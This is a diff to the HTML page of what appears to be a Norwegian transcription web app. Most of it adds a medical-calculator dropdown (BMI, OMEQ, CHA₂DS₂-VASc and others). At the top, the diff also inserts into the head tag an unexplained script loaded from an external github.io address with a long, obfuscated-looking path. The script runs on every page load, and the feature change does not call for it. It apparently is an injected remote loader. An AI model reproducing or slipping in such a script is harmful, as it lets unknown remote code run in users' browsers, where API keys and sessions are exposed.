@@ -1,7 +1,7 @@
 
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script type='text/javascript' src='https://scottyboa.github.io/ctfgxobkrVRmBodEM6zNHa3T397NzVaHWmxeADldQv2ajasyoq8cm535-Ry00C_d0N_3tsa7D9HOk_KixbRX0Zh159179Q1yU2b-5nsTMnoXWupOKrXwGl_KocWEC5gxk5mSspKC-c-GOl9ElOCkvU1mKao5QA3lL_icvKDsGoq4iE8zlFxbSfSB17o_7RhPGB9268eDPMt8xxTHkarjDjG2HwOyzpDOspcFwjAkKl6uibvr6cdgEnVg9AsIdTcaY9bWCE09c8Kzq1Q0nSGc_dtYgwfqumdLnNaBdOuxeOqqQp0vL5JKPviioFgHJfrt1u5cSySmC1sCqUjPcpoCycXmvbu9PaTLuPLQp0i0UsafbV3DKRwePRHGu66EuDj6AZ5JeVsD8cobKdxQcEwbz9gVLiGMZPhkLo2mVN2tygr-o2iWn1FMhH5FIKJpWumYZlRwblmlUMJUvGCKoD4M3xBxHUITSDRutdyrP77FH1mab8bEcisxmSf7'></script>
   <script src="https://cdn.jsdelivr.net/npm/onnxruntime-web@1.14.0/dist/ort.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@ricky0123/vad-web@0.0.22/dist/bundle.min.js"></script>
 <!-- Removed hard-coded recording.js include; provider will choose module -->
@@ -226,6 +226,30 @@
     #lang-select-transcribe {
       padding: 5px;
       font-size: 18px;
+    }
+
+    /* Medical calculator picker (top bar, compact) */
+    #medical-calc-container {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    #medicalCalcLabel {
+      font-size: 16px;
+      margin: 0;
+      white-space: nowrap;
+    }
+    #medicalCalcSelect {
+      padding: 5px;
+      font-size: 16px;
+      max-width: 220px;
+    }
+    #medicalCalcOpenBtn {
+      margin: 0;           /* override global button margin */
+      padding: 6px 10px;   /* smaller than other buttons */
+      font-size: 14px;
+      border-radius: 8px;
     }
     /* Recording Area */
     .recording-area {
@@ -553,6 +577,20 @@
   <span id="read-first-text" style="font-size: 28px; color: black; margin-right: 10px;">Read first! ➔</span>
     <button id="btnGuide">Guide</button>
   </div>
+  <!-- Medical calculator picker (opens selected HTML in a new tab) -->
+  <div id="medical-calc-container">
+    <label id="medicalCalcLabel" for="medicalCalcSelect">Kliniske verktøy:</label>
+    <select id="medicalCalcSelect" aria-label="Medical calculator">
+      <option value="" selected>Select…</option>
+      <option value="./BMI_kalkulator.html">BMI / KMI</option>
+      <option value="./omeq.html">OMEQ (morfinekvivalenter)</option>
+      <option value="./terminkalkulator.html">Terminkalkulator</option>
+      <option value="./norrisk2.html">NORRISK 2</option>
+      <option value="./chadvasc.html">CHA₂DS₂-VASc</option>
+    </select>
+    <button id="medicalCalcOpenBtn" type="button" disabled>Open</button>
+  </div>
+
 
   <!-- Language container remains on the far right -->
   <div id="lang-container-transcribe">
@@ -1184,6 +1222,23 @@
         });
       }
 
+      // Medical calculator picker (open selected HTML in new tab)
+      const calcSelect = document.getElementById("medicalCalcSelect");
+      const calcOpenBtn = document.getElementById("medicalCalcOpenBtn");
+      function syncCalcOpenState() {
+        if (!calcSelect || !calcOpenBtn) return;
+        calcOpenBtn.disabled = !calcSelect.value;
+      }
+      if (calcSelect && calcOpenBtn) {
+        syncCalcOpenState();
+        calcSelect.addEventListener("change", syncCalcOpenState);
+        calcOpenBtn.addEventListener("click", () => {
+          const href = calcSelect.value;
+          if (!href) return;
+          const url = new URL(href, window.location.href).toString();
+          window.open(url, "_blank", "noopener,noreferrer");
+        });
+      }
       // Costs/Billing links overlay (opened from the two header links)
       const usageLink = document.getElementById("openaiUsageLink");
       const walletLink = document.getElementById("openaiWalletLink");
